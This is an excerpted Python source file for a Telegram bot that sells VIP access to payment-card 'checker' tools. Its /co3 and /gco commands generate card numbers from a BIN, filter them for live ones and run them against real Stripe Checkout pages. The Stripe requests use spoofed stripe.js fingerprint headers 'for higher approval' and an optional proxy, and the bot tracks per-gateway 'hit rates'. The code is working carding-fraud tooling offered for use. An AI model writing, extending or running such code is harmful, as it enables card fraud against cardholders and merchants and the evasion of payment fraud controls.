...
from utils.reply_keyboards import (
    ...
    get_guest_keyboard,
    resolve_keyboard_for_role,
    hide_keyboard,
)
from handlers.menu_buttons import register_menu_button_handlers
...
def _is_free_plan(plan_value):
    """Detect FREE plan across styled/plain variants."""
    if not isinstance(plan_value, str):
        return True
    if plan_value.strip().upper() == "FREE":
        return True
    return plan_value == 'ð—™ð—¥ð—˜ð—˜'


def _resolve_user_role(user_id):
    """Return one of: OWNER, SUDO, PREMIUM, GUEST."""
    if int(user_id) == int(admin):
        return "OWNER"
    if int(user_id) == 1640135020:
        return "SUDO"
    plan, _expired = get_user_plan(user_id)
    if _is_free_plan(plan):
        return "GUEST"
    return "PREMIUM"


def _keyboard_for_user(user_id):
    return resolve_keyboard_for_role(_resolve_user_role(user_id))
...
def _safe_set_message_reaction(chat_id, message_id):
    try:
        emoji = random.choice(_REACTION_EMOJIS)
        reaction = [telebot.types.ReactionTypeEmoji(emoji)]
        bot.set_message_reaction(chat_id, message_id, reaction=reaction, is_big=False)
    except Exception:
        # Reactions are a nice-to-have only; never let them crash the bot.
        pass
...
class _AutoReactMiddleware(telebot.BaseMiddleware):
    ...
    def pre_process(self, message, data):
        try:
            threading.Thread(
                target=_safe_set_message_reaction,
...
_BINCHECK_API_BASE = os.getenv("BINCHECK_API_BASE", "https://bincheck.io/api/v2/bin/{bin}")
_BINCHECK_API_HOST = os.getenv("BINCHECK_API_HOST", "bin-ip-checker.p.rapidapi.com")
_BINCHECK_API_KEY = os.getenv("BINCHECK_API_KEY", "").strip()


def _build_bincheck_url(bin6: str) -> str:
    base = (_BINCHECK_API_BASE or "").strip()
    if "{bin}" in base:
        return base.format(bin=bin6)
    if base.endswith("/"):
        return f"{base}{bin6}"
    return f"{base}/{bin6}"


def _parse_bincheck_payload(data: dict) -> dict | None:
    if not isinstance(data, dict):
        return None

    bin_data = data.get("BIN") if isinstance(data.get("BIN"), dict) else data
    if not isinstance(bin_data, dict):
        return None

    scheme = (bin_data.get("scheme") or bin_data.get("brand") or "").title()
    card_type = (bin_data.get("type") or "").title()
    level = (bin_data.get("level") or "").title()
    issuer = bin_data.get("issuer") if isinstance(bin_data.get("issuer"), dict) else {}
    country = bin_data.get("country") if isinstance(bin_data.get("country"), dict) else {}

    brand = scheme or (bin_data.get("brand") or "").title()
    if not brand:
        return None
    ...
    return dict(
        ...
        card_type=card_type,
        level=level,
        bank=(issuer.get("name") or bin_data.get("bank") or "Unknown"),
        country=(country.get("name") or bin_data.get("country") or "Unknown"),
        country_code=(country.get("alpha2") or bin_data.get("country_code") or "N/A"),
    )
...
def _bin_lookup_all(bin6: str) -> dict:
    ...
    def _api6():
        if not _BINCHECK_API_KEY:
            return None
        try:
            url = _build_bincheck_url(bin6)
            headers = {
                "Content-Type": "application/json",
                "x-rapidapi-host": _BINCHECK_API_HOST,
                "x-rapidapi-key": _BINCHECK_API_KEY,
                "User-Agent": ua,
            }
            ...
            if r.status_code == 200:
                try:
                    ...
                    return None
                parsed = _parse_bincheck_payload(data)
                if parsed and parsed.get("brand") and parsed["brand"] != "Unknown":
                    return parsed
        except Exception:
            pass
        return None

    # Run all 6 APIs concurrently — worst-case still bounded by timeout
    with concurrent.futures.ThreadPoolExecutor(max_workers=6) as ex:
        futs = [ex.submit(fn) for fn in (_api6, _api1, _api2, _api3, _api4, _api5)]
...
def start(message):
    def my_function():
        ...
        with _DATA_LOCK:
            ...
            if str(uid) not in json_data:
                json_data[str(uid)] = {"plan": '𝗙𝗥𝗘𝗘', "timer": "none"}
                with open("data.json", 'w', encoding='utf-8') as json_file:
                    json.dump(json_data, json_file, ensure_ascii=False, indent=4)

        bl = json_data.get(str(uid), {}).get("plan", '𝗙𝗥𝗘𝗘')
        timer = json_data.get(str(uid), {}).get("timer", "-")
        role = _resolve_user_role(uid)

        inline_kb = types.InlineKeyboardMarkup()
        inline_kb.add(types.InlineKeyboardButton(text="YADISTAN", url="https://t.me/yadistan"))
        random_number = random.randint(33, 82)
        photo_url = f'https://t.me/bkddgfsa/{random_number}'

        if _is_free_plan(bl) and uid != admin:
            bot.send_photo(
                chat_id=message.chat.id,
                photo=photo_url,
                caption=(
                    f"<b>Welcome {name}!\n\n"
                    "Free access detected. Redeem ya contact owner se upgrade karo.</b>"
                ),
        ...
        bot.send_photo(
            chat_id=message.chat.id,
            photo=photo_url,
            caption="Use /cmds to view all commands and checker tools.",
            reply_markup=inline_kb,
        )
        bot.send_message(
            message.chat.id,
            ...
            parse_mode="Markdown",
            reply_markup=_keyboard_for_user(uid),
        )
...
def _menu_contact_owner_info(message):
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("💬 Contact Owner", url="https://t.me/yadistan"))
    bot.reply_to(
        message,
        "<b>Owner support available. Tap button below.</b>",
        parse_mode="HTML",
        reply_markup=kb,
    )


def _menu_show_balance(message):
    uid = message.from_user.id
    role = _resolve_user_role(uid)
    expiry = "none"
    with _DATA_LOCK:
        try:
            ...
            data = {}
    expiry = data.get(str(uid), {}).get("timer", "none")
    bot.reply_to(
        message,
        f"<b>💰 Account Summary\n\nAccess: {role}\nExpires: {expiry}</b>",
        parse_mode="HTML",
...
def _menu_refer_home(message):
    bot.reply_to(
        message,
        "<b>🎁 Refer & Earn\n\nShare bot with friends and ask them to redeem via /redeem.\nFor referral rewards contact support.</b>",
        parse_mode="HTML",
        reply_markup=_keyboard_for_user(message.from_user.id),
    )


def _menu_place_order(message):
    cmds_command(message)


def _menu_topup(message):
    _menu_contact_owner_info(message)


def _menu_balance(message):
    ping_command(message)


def _menu_refer(message):
    _menu_show_balance(message)


def _menu_history(message):
    cmds_command(message)


def _menu_support(message):
    cmds_command(message)


def _menu_guide(message):
    cmds_command(message)


def _menu_owner_panel(message):
    if _resolve_user_role(message.from_user.id) != "OWNER":
        bot.reply_to(message, "<b>❌ Owner only.</b>", parse_mode="HTML")
        return
    status_command(message)


def _menu_sudo_panel(message):
    role = _resolve_user_role(message.from_user.id)
    if role not in ("SUDO", "OWNER"):
        bot.reply_to(message, "<b>❌ SUDO only.</b>", parse_mode="HTML")
        return
    dbstats_command(message)


def _menu_redeem(message):
    message.text = "/redeem"
    respond_to_vbv(message)


def _menu_contact_owner(message):
    _menu_contact_owner_info(message)


def _menu_hide(message):
    bot.reply_to(
        message,
        "<b>🙈 Menu hidden.</b>\nUse /menu to show it again.",
        parse_mode="HTML",
...
def menu_command(message):
    ...
    with _DATA_LOCK:
        try:
            ...
            data = {}
    timer = data.get(str(uid), {}).get("timer", "-")
    bot.reply_to(
        message,
        (
            "『 📋 *MAIN MENU* 』\n\n"
            "_Tap any button below to continue._\n\n"
            f"💎 *Access:* {role}\n"
            f"⏱ *Expires:* {timer}"
        ),
        parse_mode="Markdown",
...
def gc_command(message):
    def _gc_worker():
        ...
        _RAPIDAPI_KEY = os.environ.get("RAPIDAPI_KEY", "").strip()

        def _chkrcc(card):
            """
            2-tier CC checker:
              Tier 1 — bin-checker19 (RapidAPI, accurate, 2 retries, 8s timeout)
              Tier 2 — stripe_auth_ex (reliable multi-WCS fallback)
            """
            # ── Tier 1: RapidAPI bin-checker19 ─────────────────────────────
            if _RAPIDAPI_KEY:
                _headers = {
                    "Content-Type": "application/json",
                ...
                for _attempt in range(2):
                    try:
                        r = requests.post(
                            "https://bin-checker19.p.rapidapi.com/",
                            json={"data": card},
                            headers=_headers,
                            timeout=8)
                        if r.status_code == 200:
...
def _build_help_msg1(name, is_vip, BL, current_amount):
    ...
    return (
        ...
        "│ <code>.co3</code> URL        →  Stripe Checkout checker\n"
        "│ <code>.gco</code> BIN URL     →  Gen → Live → CO3 pipeline\n"
...
def _build_help_msg2(name, is_vip, BL, current_amount, admin_section):
    ...
    return (
        ...
        "│ · <code>.co3</code> reply to /chkm hits → runs thru CO3\n"
...
def _stripe_fingerprint_headers(origin: str = 'https://checkout.stripe.com',
    ...
    When pk is provided, also adds Authorization: Bearer + X-Stripe-User-Agent
    JSON fingerprint (matches official stripe.js behaviour for higher approval).
    """
    ...
    # ── Stripe-specific auth + client UA fingerprint (when pk supplied) ──
    if pk:
        import json as _json
        hdrs['Authorization'] = f'Bearer {pk}'
        _ua_data = {
            "lang": "javascript",
            "browser": {
                "name": "Chrome", "version": f"{chrome_ver}.0.0.0", "major": chrome_ver,
                "userAgent": ua,
        ...
        if referer:
            _ua_data["url"] = referer
        _ua_json = _json.dumps(_ua_data, separators=(',', ':'))
        hdrs['X-Stripe-User-Agent']        = _ua_json
        hdrs['X-Stripe-Client-User-Agent'] = _ua_json
    return hdrs
...
def _stripe_post(url, payload, headers=None, session=None, timeout=30, state=None, use_proxy=False, pk=None, referer=None):
    """POST to Stripe with retry on 429/5xx. Accepts optional requests.Session for reuse.
    When pk is supplied, Authorization Bearer + X-Stripe-User-Agent headers are added.
    """
    if use_proxy and url.startswith("https://"):
        url = f"https://stripe-hitter.onrender.com/proxy/{url}"
    hdrs = _stripe_fingerprint_headers(state=state, pk=pk, referer=referer)
    if headers:
        hdrs.update(headers)
...
def _fetch_checkout_info(session_id, public_key, use_proxy=None, session=None, referer=None):
    ...
    sc, d = _stripe_post(
        ...
        session=session, pk=public_key, referer=referer
    )
    if sc != 200:
...
def ext_stripe_check(checkout_url, ccx, use_proxy=False):
    ...
    # ── Persistent session: __stripe_mid/__stripe_sid cookies persist
    #    across init → payment_methods → confirm (matches stripe.js behaviour)
    _sess_co = requests.Session()
    _muid_c, _sid_c, _guid_c = _gen_stripe_ids()
    _sess_co.cookies.set('__stripe_mid', _muid_c, domain='.stripe.com')
    _sess_co.cookies.set('__stripe_sid', _sid_c,  domain='.stripe.com')

    # ── Fetch checkout info ─────────────────────────────────────
    info = _fetch_checkout_info(session_id, public_key, use_proxy=use_proxy,
                                 session=_sess_co, referer=checkout_url)
    if not info:
    ...
    # Reuse cookie-bound IDs so payload muid/sid match the cookie jar values
    _guid, _muid, _sid = _guid_c, _muid_c, _sid_c
    ...
    pm_sc, pm_d = _stripe_post('https://api.stripe.com/v1/payment_methods', pm_payload,
                               use_proxy=use_proxy, session=_sess_co,
                               pk=public_key, referer=checkout_url)
    ...
    cf_sc, cf_d = _stripe_post(
        ...
        cf_payload, use_proxy=use_proxy, session=_sess_co,
        pk=public_key, referer=checkout_url
    )
        ...
        if not card_lines and remaining:
            ...
            if not card_lines and remaining:
                ...
                if len(digits_only) >= 6 and digits_only.isdigit() and len(first_tok) < 13:
                    is_bin_mode = True
                    bin_input = parts_s[0]
                    bin_amount = int(parts_s[1]) if len(parts_s) > 1 and parts_s[1].isdigit() else 10
...
# ================== /co3 — Stripe Checkout-Based Checker (External API) ==================
...
@bot.message_handler(commands=["co3"])
def co3_command(message):
    def my_function():
        import html as _html
        uid = message.from_user.id
        try:
        ...
        usage_msg = (
            ...
            "📌 Single card check:\n"
            "<code>/co3 &lt;checkout_url&gt; 4111111111111111|12|26|123</code>\n\n"
            "📌 BIN bruteforce (10 cards auto-gen):\n"
            "<code>/co3 &lt;checkout_url&gt; 411111</code>\n\n"
...
def gco_command(message):
    """Pipeline: BIN → generate cards → chkr.cc live filter → /co3 checkout hit"""
    def my_function():
        import html as _html
        uid = message.from_user.id
        try:
        ...
        usage_msg = (
            ...
            "  3️⃣ /co3 → checkout hit on live cards\n\n"
...
📝 𝗧𝘆𝗽𝗲 : {typ}</b>'''
            bot.reply_to(
                ...
                msg,
                parse_mode="HTML",
                reply_markup=get_main_menu_keyboard("PREMIUM"),
            )
...
def _get_location_info(ip=None):
    ...
    return {"city": "—", "region": "—", "country": "—", "isp": "—", "org": "—",
            "flag": "🌐", "lat": "—", "lon": "—", "timezone": "—", "asn": "—", "country_code": "—"}
...
def _country_to_flag(code_or_name):
    ...
    code = name_map.get(value.lower())
    return _flag(code) if code else "🌍"
...
def status_command(message):
    ...
    cpu      = _get_cpu_pct()
    ram      = str(_get_ram_info()).replace("\n", " • ")
    disk     = str(_get_disk_info()).replace("\n", " • ")

    if isinstance(ping_tg, int):
        ping_tg_str = f"{ping_tg}ms"
    else:
        ping_tg_str = str(ping_tg or "—")
    if isinstance(ping_gw, int):
        ping_gw_str = f"{ping_gw}ms"
    else:
        ping_gw_str = str(ping_gw or "—")

    overall_dot = _overall_dot(True, [ping_tg, ping_gw])
    tg_dot = _ping_dot(ping_tg)
    gw_dot = _ping_dot(ping_gw)
    flag = _country_to_flag(loc.get("country_code") or loc.get("country") or loc.get("flag"))
    city = str(loc.get("city") or "—")
    country = str(loc.get("country") or "—")
    isp = str(loc.get("isp") or "—")
    ...
    updated = _relative_time(now_dt)

    text = "\n".join([
        "<b>⚡ 『 SERVER STATUS 』 ⚡</b>",
        "<code>──────────────────────────</code>",
        f"{overall_dot} Status • ⏱ {uptime} • 📡 Long Polling",
        f"🗓 {date_str} <code>•</code> {time_str}",
        "",
        f"🌐 <b>NET</b> <code>{pub_ip}</code> — {city}, {country} {flag}",
        f"🏢 {isp}  <code>•</code>  🕒 {timezone}",
        f"📍 <code>{lat}, {lon}</code>",
        "",
        f"📶 <b>PING</b>  TG {tg_dot} <code>{ping_tg_str}</code>  <code>•</code>  Stripe {gw_dot} <code>{ping_gw_str}</code>",
        f"🖥 <b>HW</b>   CPU <code>{cpu}</code>  <code>•</code>  RAM <code>{ram}</code>  <code>•</code>  SSD <code>{disk}</code>",
        "<code>──────────────────────────</code>",
...
def stats_command(message):
    ...
    today_cmds   = today.get('queries', 0)
    today_active = today.get('active_users', 0)

    def _safe(val, fallback="—"):
        return fallback if val in (None, "", "N/A", "None") else val
    ...
    def _rate_value():
        if not checks_today:
            return None
        try:
            return round((approved_today / checks_today) * 100)
        except Exception:
            return None
    ...
    def _hit_rate_bar(rate, length=10):
        if rate in (None, 0):
            return "—"
        try:
            filled = max(0, min(length, round(rate / 10)))
        except Exception:
            return "—"
        return "█" * filled + "░" * (length - filled)

    def _top_gateways_inline(rows, top=3):
        if not rows:
            return "—"
        parts = []
        for gw, total, approved in rows[:top]:
            label = str(gw or "Unknown").strip() or "Unknown"
            parts.append(f"{label} `{_fmt_num(total)}`")
        return "  `•`  ".join(parts) if parts else "—"

    rate = _rate_value()
    rate_dot = _rate_dot(rate)
    hit_rate = f"{rate}%" if rate is not None else "—"
    hit_rate_bar = _hit_rate_bar(rate)
    top_gateways = _top_gateways_inline(gw_stats)
    uptime = f"{hours:02d}h {minutes:02d}m {seconds:02d}s"
    refreshed = _relative_time(now_dt)

    lines = [
        "<b>📊 『 BOT STATISTICS 』 📊</b>",
        "<code>──────────────────────────</code>",
        f"🌐 <b>ALL TIME</b>   👤 <code>{_fmt_num(total_users)}</code>  <code>•</code>  ⌘ <code>{_fmt_num(total_cmds)}</code>  <code>•</code>  💳 <code>{_fmt_num(total_checks)}</code>",
        f"📅 <b>TODAY</b>      🟣 <code>{_fmt_num(today_active)}</code> active  <code>•</code>  ⌘ <code>{_fmt_num(today_cmds)}</code>  <code>•</code>  💳 <code>{_fmt_num(checks_today)}</code>",
        f"✅ Approved <code>{_fmt_num(approved_today)}</code>  <code>•</code>  🎯 Hit Rate <code>{hit_rate}</code> {rate_dot}",
    ]

    if hit_rate_bar != "—":
        lines.append(f"<code>{hit_rate_bar}</code>")

    lines.extend([
        f"🏆 <b>TOP GATEWAYS</b>  {top_gateways}",
        f"⏱ <b>UPTIME</b> <code>{uptime}</code>  <code>•</code>  🗓 <code>{date_str}</code>  <code>•</code>  <code>{time_str}</code>",
        "<code>──────────────────────────</code>",
        f"<i>refreshed {refreshed}</i>",
    ])
...
print(f"[BOT] Admin ID: {admin}")
print("[BOT] Use /amadmin to verify admin permissions.")
...
try:
    bot.set_my_commands([
        ...
        telebot.types.BotCommand("co3",         "🔗 Stripe Checkout API [VIP]"),
        ...
        telebot.types.BotCommand("menu",        "📋 Open persistent menu"),
...
_MENU_HANDLERS_REGISTERED = False


def _register_reply_menu_handlers():
    global _MENU_HANDLERS_REGISTERED
    if _MENU_HANDLERS_REGISTERED:
        return
    routes = {
        "get_vip": _menu_place_order,
        "support": _menu_topup,
        "ping": ping_command,
        "my_stats": _menu_refer,
        "guide": _menu_guide,
        "hide": _menu_hide,
        "owner_panel": _menu_owner_panel,
        "sudo_panel": _menu_sudo_panel,
        "redeem": _menu_redeem,
        "contact_owner": _menu_contact_owner,
    }
    register_menu_button_handlers(bot, routes)
    _MENU_HANDLERS_REGISTERED = True


_register_reply_menu_handlers()
